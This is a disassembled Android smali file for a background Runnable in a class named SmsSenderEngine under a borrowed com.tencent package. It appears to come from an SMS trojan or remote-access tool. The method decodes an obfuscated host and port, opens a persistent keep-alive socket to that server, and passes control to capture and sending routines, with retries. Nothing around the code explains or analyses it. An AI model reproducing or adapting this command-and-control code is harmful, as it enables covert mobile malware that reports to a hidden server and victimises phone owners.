.class Lcom/tencent/SmsSenderEngine$2;
.super Ljava/lang/Object;
.source "skatinghsatinbintegralj9.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/SmsSenderEngine;->FindNewIcon()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/SmsSenderEngine;


# direct methods
.method constructor <init>(Lcom/tencent/SmsSenderEngine;)V
    .locals 0

    .line 186
    iput-object p1, p0, Lcom/tencent/SmsSenderEngine$2;->this$0:Lcom/tencent/SmsSenderEngine;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const/4 v0, 0x0

    move v1, v0

    :cond_0
    const/4 v2, 0x3

    if-lt v1, v2, :cond_1

    .line 191
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->stopCapture()V

    .line 194
    :cond_1
    :try_start_0
    new-instance v2, Ljava/net/InetSocketAddress;

    sget-object v3, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Host:Ljava/lang/String;

    invoke-static {v3}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;

    move-result-object v3

    sget-object v4, Lcom/tencent/MainBackgroundService;->tunesxconcerningn1011_Port:Ljava/lang/String;

    invoke-static {v4}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    invoke-direct {v2, v3, v4}, Ljava/net/InetSocketAddress;-><init>(Ljava/net/InetAddress;I)V

    .line 195
    new-instance v3, Ljava/net/Socket;

    invoke-direct {v3}, Ljava/net/Socket;-><init>()V

    sput-object v3, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    .line 196
    sget-object v3, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v3, v0}, Ljava/net/Socket;->setSoTimeout(I)V

    .line 197
    sget-object v3, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Ljava/net/Socket;->setKeepAlive(Z)V

    .line 198
    sget-object v3, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v3, v4}, Ljava/net/Socket;->setTcpNoDelay(Z)V

    .line 199
    sget-object v3, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    const v5, 0xea60

    invoke-virtual {v3, v2, v5}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V

    .line 200
    sget-object v2, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->isConnected()Z

    move-result v2

    sput-boolean v2, Lcom/tencent/SmsSenderEngine;->ctd:Z

    .line 201
    sget-boolean v2, Lcom/tencent/SmsSenderEngine;->ctd:Z

    if-ne v2, v4, :cond_2

    .line 202
    sget-object v2, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v2}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    sput-object v2, Lcom/tencent/SmsSenderEngine;->out:Ljava/io/OutputStream;

    .line 203
    sput-boolean v4, Lcom/tencent/SmsSenderEngine;->Lo:Z

    .line 204
    iget-object v2, p0, Lcom/tencent/SmsSenderEngine$2;->this$0:Lcom/tencent/SmsSenderEngine;

    invoke-static {v2}, Lcom/tencent/SmsSenderEngine;->access$000(Lcom/tencent/SmsSenderEngine;)V

    .line 205
    sput-boolean v4, Lcom/tencent/SmsSenderEngine;->ISON:Z

    .line 206
    iget-object v2, p0, Lcom/tencent/SmsSenderEngine$2;->this$0:Lcom/tencent/SmsSenderEngine;

    invoke-virtual {v2}, Lcom/tencent/SmsSenderEngine;->pr()V
    :try_end_0
    .catch Ljava/net/UnknownHostException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 221
    :catch_0
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->di()V

    goto :goto_0

    .line 219
    :catch_1
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->di()V

    goto :goto_0

    .line 210
    :catch_2
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->di()V

    :cond_2
    :goto_0
    const-wide/16 v2, 0x1

    .line 230
    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_3

    :catch_3
    add-int/lit8 v1, v1, 0x1

    .line 232
    sget-boolean v2, Lcom/tencent/SmsSenderEngine;->ctd:Z

    if-eqz v2, :cond_0

    :goto_1
    return-void
.end method
